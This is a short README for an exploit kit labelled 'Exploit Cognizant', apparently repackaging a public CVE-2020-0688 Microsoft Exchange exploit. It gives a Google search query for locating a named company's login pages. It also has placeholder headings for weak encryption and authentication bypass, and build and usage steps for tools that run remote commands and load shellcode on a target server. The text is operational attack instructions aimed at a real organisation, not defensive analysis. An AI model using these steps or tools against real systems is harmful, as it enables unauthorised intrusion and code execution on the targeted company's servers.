README.md

*Target search 
GHDB : allintitle: "Digital operations fabric"
	inurl: cognizant.com/#/login

*Weak Encryption/Decryption
*/Weak_Encryption_Decryption

*Auth_Bypass/Prive_Esc
*/..working


## Exploit Cognizant

### build

	csc ExchangeCmd.cs
	csc ExchangeDetect.cs

### usage
	ExchangeDetect <target> <user> <pass>

 ![](https://raw.githubusercontent.com/zcgonvh/CVE-2020-0688/master/detect.png)
 
	ExchangeCmd <target> <user> <pass>
	sub commands:
		exec <cmd> [args]
		  exec command
			
		arch
		  get remote process architecture(for shellcode)
			
		shellcode <shellcode.bin>
		  run shellcode
			
		exit
		  exit program
![](https://raw.githubusercontent.com/zcgonvh/CVE-2020-0688/master/exp.png)

for more information, read [writeup.pdf](https://raw.githubusercontent.com/zcgonvh/CVE-2020-0688/master/writeup.pdf)(in chinese).
